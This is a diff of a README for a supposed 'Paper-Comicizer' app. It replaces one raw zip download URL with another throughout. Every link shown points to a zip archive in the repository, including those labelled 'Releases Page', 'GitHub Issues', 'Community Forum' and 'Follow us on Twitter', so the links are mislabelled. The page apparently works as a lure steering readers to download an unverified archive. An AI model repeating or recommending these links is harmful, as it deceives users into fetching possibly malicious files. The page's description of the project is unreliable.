@@ -1,7 +1,7 @@
 # 🎨 Paper-Comicizer - Turn Your Papers into Fun Comics!
 
 ## 🔗 Download Now!
-[![Download Paper-Comicizer](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip)](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip)
+[![Download Paper-Comicizer](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip)](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Paper-Comicizer! This application helps you transform dull papers int
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to access the downloads: [Download Page](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip)
+1. **Visit the Releases Page:** Go to the following link to access the downloads: [Download Page](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip)
 
 2. **Choose the Right Version:** You will see a list of available versions. Look for the most recent release. This version will have the latest features and fixes.
 
@@ -94,7 +94,7 @@ If you face any issues while using Paper-Comicizer, try the following:
 - Check if you are using the latest version of the application.
 - Restart your computer and try again if the app freezes.
 
-For further assistance, visit the issues section on the [GitHub page](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip).
+For further assistance, visit the issues section on the [GitHub page](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip).
 
 ## 📅 Updates
 
@@ -104,8 +104,8 @@ Keep an eye out for new releases and updates. They will usually include new feat
 
 For more information, feel free to explore these resources:
 
-- [GitHub Issues](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip): Report issues or find solutions.
-- [Community Forum](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip): Share ideas and ask questions.
-- [Follow us on Twitter](https://raw.githubusercontent.com/Makena123456/Paper-Comicizer/main/services/Paper-Comicizer-1.6.zip): Get updates on features and releases.
+- [GitHub Issues](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip): Report issues or find solutions.
+- [Community Forum](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip): Share ideas and ask questions.
+- [Follow us on Twitter](https://github.com/Makena123456/Paper-Comicizer/raw/refs/heads/main/components/Paper-Comicizer-v3.3.zip): Get updates on features and releases.
 
 Thank you for using Paper-Comicizer! We are excited to see the comics you create.
